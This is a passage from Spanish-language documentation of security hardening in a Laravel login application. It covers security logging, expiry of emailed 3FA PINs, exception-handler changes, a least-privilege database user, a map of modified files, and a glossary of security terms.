            'ip'         => $request->ip(),          // IP del usuario
            'user_agent' => $request->userAgent(),   // Navegador/dispositivo
            'timestamp'  => now()->toIso8601String(),// Fecha/hora ISO 8601
        ]);
    }
}
```

**¿Por qué registrar logins exitosos?**

Es tan importante como registrar los fallidos:

1. **Detección de acceso no autorizado**: Si ves un login exitoso desde una IP de Rusia y el usuario está en México, es una cuenta comprometida
2. **Detección de horarios inusuales**: Login a las 3 AM de un usuario que normalmente trabaja de 9-5
3. **Correlación**: Si ves 100 intentos fallidos seguidos de 1 exitoso, el atacante descubrió la contraseña
4. **Cumplimiento**: PCI-DSS requiere registro de todos los accesos

### LogPasswordChange.php — Explicación

```php
public function handle(PasswordReset $event): void
{
    $request = request();

    // Se usa 'warning' en lugar de 'info' porque un cambio de
    // contraseña es un evento de alta sensibilidad
    Log::channel('security')->warning('🔑 [SEGURIDAD] Contraseña cambiada/reseteada', [
        'user_id'    => $event->user->id,
        'email'      => $event->user->email,
        'ip'         => $request->ip(),
        'user_agent' => $request->userAgent(),
        'url'        => $request->fullUrl(),    // ¿Fue desde /password o /reset-password?
        'timestamp'  => now()->toIso8601String(),
    ]);
}
```

**¿Por qué `warning` y no `info`?**

Los niveles de log en orden de severidad son:

| Nivel | Uso |
|-------|-----|
| `debug` | Información detallada de desarrollo |
| `info` | Eventos normales esperados (login, logout) |
| `notice` | Eventos normales pero significativos |
| **`warning`** | **Eventos que requieren atención pero no son errores** |
| `error` | Errores que requieren acción |
| `critical` | Fallos de componentes críticos |
| `alert` | Se requiere acción inmediata |
| `emergency` | Sistema inutilizable |

Un cambio de contraseña es `warning` porque:
- Si es legítimo: el usuario cambió su contraseña (normal pero significativo)
- Si es malicioso: un atacante comprometió la cuenta y está cambiando la contraseña para bloquear al usuario real (account takeover)

### EventServiceProvider — Registro de nuevos eventos

```php
protected $listen = [
    // Eventos existentes...
    Registered::class => [SendEmailVerificationNotification::class],
    Failed::class => [LogAuthenticationFailure::class],
    Lockout::class => [LogLockoutEvent::class],

    // NUEVOS
    Login::class => [LogSuccessfulLogin::class],           // ← Login exitoso
    PasswordReset::class => [LogPasswordChange::class],     // ← Cambio de password
];
```

### Migración de listeners existentes al canal `security`

También se cambió `LogAuthenticationFailure.php` y `LogLockoutEvent.php` de:

```php
Log::warning('🔒 ...');  // Iba al log general
```

a:

```php
Log::channel('security')->warning('🔒 ...');  // Va al log de seguridad
```

---

## 12. Componente 11: Expiración de PIN 3FA

### Archivo: `app/Http/Controllers/Auth/ThreeFactorController.php`

### ¿Qué se cambió?

Se agregó una constante de expiración y validación temporal:

```php
private const PIN_EXPIRATION_SECONDS = 300; // 5 minutos
```

### ¿Por qué era un problema?

Antes, el PIN 3FA no tenía expiración. El flujo era:

1. Admin accede a `/verify/3fa`
2. Se genera PIN aleatorio, se hashea con bcrypt, se guarda en BD
3. Se envía el PIN por email
4. El Admin ingresa el PIN... ¿cuándo? Podría ser 5 minutos después, 1 hora, ¡o 3 días!

**Escenario de riesgo:**
1. Admin solicita PIN a las 9:00 AM
2. No lo usa y se va
3. 3 horas después, un atacante encuentra el email del Admin abierto
4. El PIN del email sigue siendo válido
5. El atacante lo usa para completar 3FA

### ¿Cómo funciona ahora?

**Al generar el PIN (`show`):**

```php
// Generar PIN
$pin = str_pad((string) random_int(0, 999999), 6, '0', STR_PAD_LEFT);
$user->update(['three_factor_pin' => Hash::make($pin)]);

// NUEVO: Guardar timestamp de generación en la sesión
session(['3fa_pin_generated_at' => now()->timestamp]);

// Enviar por email
Mail::to($user->email)->send(new ThreeFactorPinMail($pin));
```

**Al verificar el PIN (`verify`):**

```php
// NUEVO: Verificar expiración
$pinGeneratedAt = session('3fa_pin_generated_at');

// Verificar que: 1) el timestamp existe, 2) no han pasado más de 5 minutos
if (!$pinGeneratedAt || (now()->timestamp - $pinGeneratedAt) > self::PIN_EXPIRATION_SECONDS) {
    // PIN expirado: invalidar en BD, limpiar sesión, log del evento
    $user->update(['three_factor_pin' => null]);
    session()->forget('3fa_pin_generated_at');

    Log::channel('security')->warning('⏰ [SEGURIDAD] Intento con PIN expirado', [...]);

    // Redirigir al formulario para generar uno nuevo
    return redirect()->route('verify.3fa')
        ->withErrors(['pin' => 'El PIN ha expirado. Se ha enviado uno nuevo.']);
}
```

**¿Por qué 5 minutos?**

- Es suficiente para: recibir el email → abrirlo → copiar el PIN → pegarlo
- Es corto suficiente para minimizar la ventana de ataque
- Estándar de la industria para códigos OTP por email (5-10 minutos)

**¿Por qué se almacena el timestamp en la sesión y no en la BD?**

1. **Rendimiento**: No requiere columna adicional en la tabla `users`
2. **Seguridad**: Si un atacante tiene acceso a la BD, no puede ver cuándo se generó el PIN
3. **Vinculado a la sesión**: Si la sesión expira o se invalida, el timestamp también desaparece

---

## 13. Componente 12: Logging en Controladores MFA

### Archivos: `TwoFactorController.php`, `ThreeFactorController.php`, `AuthenticatedSessionController.php`

### ¿Qué se añadió?

Se agregó logging de seguridad en CADA punto de decisión del pipeline MFA:

#### En TwoFactorController (2FA):

```php
// Cuando el código TOTP es incorrecto
if (! $valid) {
    Log::channel('security')->warning('❌ [SEGURIDAD] Verificación 2FA fallida', [
        'user_id'    => $user->id,
        'email'      => $user->email,
        'ip'         => $request->ip(),
        'user_agent' => $request->userAgent(),
        'timestamp'  => now()->toIso8601String(),
    ]);
    return back()->withErrors([...]);
}

// Cuando el código TOTP es correcto
session(['auth_level' => 2]);
Log::channel('security')->info('✅ [SEGURIDAD] Verificación 2FA exitosa', [
    'user_id'   => $user->id,
    'email'     => $user->email,
    'ip'        => $request->ip(),
    'timestamp' => now()->toIso8601String(),
]);
```

#### En AuthenticatedSessionController:

**Login (1FA):**
```php
session(['auth_level' => 1]);
Log::channel('security')->info('✅ [SEGURIDAD] Login 1FA exitoso, pipeline MFA iniciado', [
    'user_id'    => Auth::id(),
    'email'      => Auth::user()->email,
    'ip'         => $request->ip(),
    'user_agent' => $request->userAgent(),
    'timestamp'  => now()->toIso8601String(),
]);
```

**Logout:**
```php
// IMPORTANTE: Capturar datos ANTES de hacer logout
$userId = Auth::id();
$userEmail = Auth::user()?->email;

Auth::guard('web')->logout();

Log::channel('security')->info('🚪 [SEGURIDAD] Logout realizado', [
    'user_id'   => $userId,     // Usamos la variable capturada
    'email'     => $userEmail,  // Auth::user() ya sería null aquí
    'ip'        => $request->ip(),
    'timestamp' => now()->toIso8601String(),
]);
```

**¿Por qué se capturan los datos ANTES del logout?**

Porque `Auth::guard('web')->logout()` destruye la sesión del usuario y limpia el Auth state. Después de esa línea, `Auth::id()` retorna `null` y `Auth::user()` retorna `null`. Si intentas logear el `user_id` después del logout, obtienes `null` en el log, que es inútil para auditoría.

### Flujo completo de logs para un Admin:

```
[INFO]    ✅ Login 1FA exitoso, pipeline MFA iniciado     {user_id: 1, email: admin@...}
[INFO]    ✅ Verificación 2FA exitosa                      {user_id: 1, email: admin@...}
[INFO]    📧 PIN 3FA enviado por correo                    {user_id: 1, email: admin@...}
[INFO]    ✅ Verificación 3FA exitosa (Admin)              {user_id: 1, email: admin@...}
... (tiempo de trabajo) ...
[INFO]    🚪 Logout realizado                              {user_id: 1, email: admin@...}
```

Si un atacante intenta:

```
[WARNING] 🔒 Intento de autenticación fallido             {email: admin@..., ip: 45.33.xxx}
[WARNING] 🔒 Intento de autenticación fallido             {email: admin@..., ip: 45.33.xxx}
[WARNING] 🔒 Intento de autenticación fallido             {email: admin@..., ip: 45.33.xxx}
[WARNING] 🔒 Intento de autenticación fallido             {email: admin@..., ip: 45.33.xxx}
[WARNING] 🔒 Intento de autenticación fallido             {email: admin@..., ip: 45.33.xxx}
[WARNING] 🚨 Cuenta bloqueada por exceso de intentos      {email: admin@..., ip: 45.33.xxx}
```

---

## 14. Componente 13: Exception Handler Hardened

### Archivo: `app/Exceptions/Handler.php`

### Cambio 1: Ampliar `$dontFlash`

```diff
  protected $dontFlash = [
      'current_password',
      'password',
      'password_confirmation',
+     'pin',
+     'code',
+     'two_factor_secret',
+     'three_factor_pin',
  ];
```

**¿Qué es `$dontFlash`?**

Cuando un formulario falla la validación, Laravel "flashea" (almacena temporalmente) los valores del formulario en la sesión para poder repoblar el formulario con `old('campo')`. Esto permite que el usuario no tenga que rellenar todo de nuevo.

**PERO** no queremos flashear datos sensibles como contraseñas o códigos MFA, porque:
1. Se almacenan en la sesión (que podría ser interceptada)
2. Aparecerían como `value="482931"` en el HTML del formulario
3. Podrían quedar en caché del navegador

**Campos agregados:**
- `pin`: El PIN de 3FA que el Admin ingresa
- `code`: El código TOTP de 2FA
- `two_factor_secret`: El secreto TOTP (por si acaso)
- `three_factor_pin`: El PIN hasheado (por si acaso)

### Cambio 2: Logging de excepciones de autenticación

```php
$this->reportable(function (AuthenticationException $e) {
    $request = request();
    Log::channel('security')->warning('🔐 [SEGURIDAD] Acceso no autenticado rechazado', [
        'url'        => $request->fullUrl(),
        'method'     => $request->method(),
        'ip'         => $request->ip(),
        'user_agent' => $request->userAgent(),
        'guard'      => implode(', ', $e->guards()),
        'timestamp'  => now()->toIso8601String(),
    ]);
})->stop();
```

**¿Cuándo se dispara?**

Cuando alguien intenta acceder a una ruta protegida por `middleware('auth')` sin estar logueado. Esto puede ser:
- Un usuario cuya sesión expiró
- Un atacante probando URLs directamente
- Un bot escaneando rutas

**¿Qué es `->stop()`?**

Le dice a Laravel que NO continúe con el handler por defecto después de ejecutar este callback. Sin `stop()`, Laravel registraría el evento dos veces.

### Cambio 3: Logging de errores HTTP de seguridad

```php
$this->reportable(function (HttpException $e) {
    $securityCodes = [403, 419, 429];
    if (in_array($e->getStatusCode(), $securityCodes)) {
        Log::channel('security')->warning('⚠️ Error HTTP de seguridad', [
            'status_code' => $e->getStatusCode(),
            'message'     => $e->getMessage(),
            'url'         => $request->fullUrl(),
            'user_id'     => $request->user()?->id,
            // ...
        ]);
    }
})->stop();
```

**¿Qué significan estos códigos?**

| Código | Significado | Cuándo ocurre en LoginSeguro |
|--------|------------|---------------------------|
| **403** | Forbidden | Usuario intenta acceder a dashboard de otro rol (ej: Invitado intenta `/admin-dashboard`) |
| **419** | Page Expired | Token CSRF expirado o inválido. Puede indicar un ataque CSRF |
| **429** | Too Many Requests | Rate limit excedido. Posible ataque de fuerza bruta |

Estos tres códigos son **indicadores de actividad sospechosa** que merece monitoreo especial.

---

## 15. Componente 14: Documentación

### Archivos:
- `SECURITY.md` — Documentación completa de seguridad del proyecto
- `.env.example` — Template de configuración con valores seguros documentados

### ¿Por qué es importante documentar?

1. **Onboarding**: Un nuevo desarrollador entiende las protecciones sin leer todo el código
2. **Auditoría**: Un auditor de seguridad puede verificar rápidamente qué protecciones están implementadas
3. **Producción**: El equipo de DevOps sabe exactamente qué variables configurar
4. **Incidentes**: Ante un ataque, la documentación indica qué logs revisar y dónde

### `.env.example` mejorado

Se agregaron:
- Comentarios explicando cada variable de seguridad
- Valores recomendados para producción
- Instrucciones para crear un usuario MySQL con mínimos privilegios:

```bash
CREATE USER 'loginseguro_app'@'localhost' IDENTIFIED BY 'password_fuerte';
GRANT SELECT, INSERT, UPDATE, DELETE ON loginseguro.* TO 'loginseguro_app'@'localhost';
```

Este usuario solo puede leer, insertar, actualizar y borrar registros. **NO puede** crear tablas, eliminar la base de datos, crear otros usuarios, ni acceder a otras bases de datos.

---

## 16. Mapa Completo de Archivos Modificados

```
LoginSeguro/
├── .env                          ← [MODIFICADO] Session driver, lifetime, encrypt, same_site
├── .env.example                  ← [MODIFICADO] Template seguro con documentación
├── SECURITY.md                   ← [NUEVO] Documentación de seguridad
├── config/
│   ├── auth.php                  ← [MODIFICADO] password_timeout: 10800 → 1800
│   ├── cors.php                  ← [MODIFICADO] Wildcards eliminados
│   ├── google2fa.php             ← [MODIFICADO] forbid_old_passwords: true
│   ├── hashing.php               ← [MODIFICADO] bcrypt → argon2id
│   ├── logging.php               ← [MODIFICADO] Canal 'security' + daily rotation
│   └── session.php               ← [MODIFICADO] encrypt=true, same_site=strict
├── app/
│   ├── Exceptions/
│   │   └── Handler.php           ← [MODIFICADO] dontFlash + logging 403/419/429
│   ├── Http/
│   │   ├── Controllers/Auth/
│   │   │   ├── AuthenticatedSessionController.php  ← [MODIFICADO] Login/logout logging
│   │   │   ├── RegisteredUserController.php        ← [MODIFICADO] Fix double-hash + logging
│   │   │   ├── ThreeFactorController.php           ← [MODIFICADO] PIN expiration + logging
│   │   │   └── TwoFactorController.php             ← [MODIFICADO] 2FA logging
│   │   └── Middleware/
│   │       └── SecurityHeadersMiddleware.php       ← [MODIFICADO] +5 headers nuevos
│   ├── Listeners/
│   │   ├── LogAuthenticationFailure.php            ← [MODIFICADO] Canal security
│   │   ├── LogLockoutEvent.php                     ← [MODIFICADO] Canal security
│   │   ├── LogSuccessfulLogin.php                  ← [NUEVO] Login exitoso
│   │   └── LogPasswordChange.php                   ← [NUEVO] Cambio de password
│   └── Providers/
│       └── EventServiceProvider.php                ← [MODIFICADO] +2 eventos
```

**Total: 20 archivos** (13 modificados + 3 nuevos + 4 actualizados)

---

## 17. Glosario de Conceptos de Seguridad

| Concepto | Definición |
|----------|-----------|
| **OWASP** | Open Web Application Security Project — organización que publica estándares de seguridad web |
| **OWASP Top 10** | Las 10 vulnerabilidades más críticas en aplicaciones web |
| **CSRF** | Cross-Site Request Forgery — un sitio malicioso hace que tu navegador envíe solicitudes autenticadas a otro sitio |
| **XSS** | Cross-Site Scripting — inyección de código JavaScript malicioso en una página web |
| **MITM** | Man-in-the-Middle — un atacante intercepta comunicaciones entre dos partes |
| **HSTS** | HTTP Strict Transport Security — fuerza HTTPS en el navegador |
| **CSP** | Content Security Policy — controla qué recursos puede cargar una página |
| **CORS** | Cross-Origin Resource Sharing — controla qué sitios pueden hacer solicitudes a tu API |
| **COOP** | Cross-Origin Opener Policy — aísla ventanas del navegador entre orígenes |
| **CORP** | Cross-Origin Resource Policy — controla quién puede cargar tus recursos |
| **TOTP** | Time-based One-Time Password — código que cambia cada 30 segundos (Google Authenticator) |
| **MFA** | Multi-Factor Authentication — autenticación con múltiples factores |
| **RBAC** | Role-Based Access Control — control de acceso basado en roles |
| **Defense in Depth** | Múltiples capas de seguridad; si una falla, las demás protegen |
| **Least Privilege** | Dar solo los permisos mínimos necesarios |
| **Fail Secure** | Si algo falla, debe fallar de forma segura (denegar acceso por defecto) |
| **Session Fixation** | Ataque donde el atacante fija el ID de sesión antes de que el usuario se autentique |
| **Session Hijacking** | Robo de una sesión activa (mediante cookies, XSS, etc.) |
| **Credential Stuffing** | Usar credenciales robadas de un sitio para intentar login en otro |
| **Brute Force** | Probar contraseñas hasta encontrar la correcta |
| **Rainbow Tables** | Tablas precomputadas de hashes para descifrar contraseñas rápidamente |
| **Salt** | Valor aleatorio agregado a la contraseña antes de hashear (previene rainbow tables) |
| **CSPRNG** | Cryptographically Secure Pseudo-Random Number Generator (ej: `random_int()`) |
| **PCI-DSS** | Payment Card Industry Data Security Standard — estándar de seguridad para pagos |
| **ISO 27001** | Estándar internacional para sistemas de gestión de seguridad de la información |
| **SIEM** | Security Information and Event Management — sistema de monitoreo de seguridad |
| **Spectre** | Vulnerabilidad de hardware (CPU) que permite leer memoria de otros procesos |
| **Replay Attack** | Reutilizar una solicitud o token capturado previamente |
| **User Enumeration** | Técnica para descubrir si un usuario/email existe en un sistema |
| **Timing Attack** | Medir el tiempo de respuesta para inferir información (ej: longitud de contraseña) |
| **Account Takeover** | Un atacante toma control completo de la cuenta de un usuario |
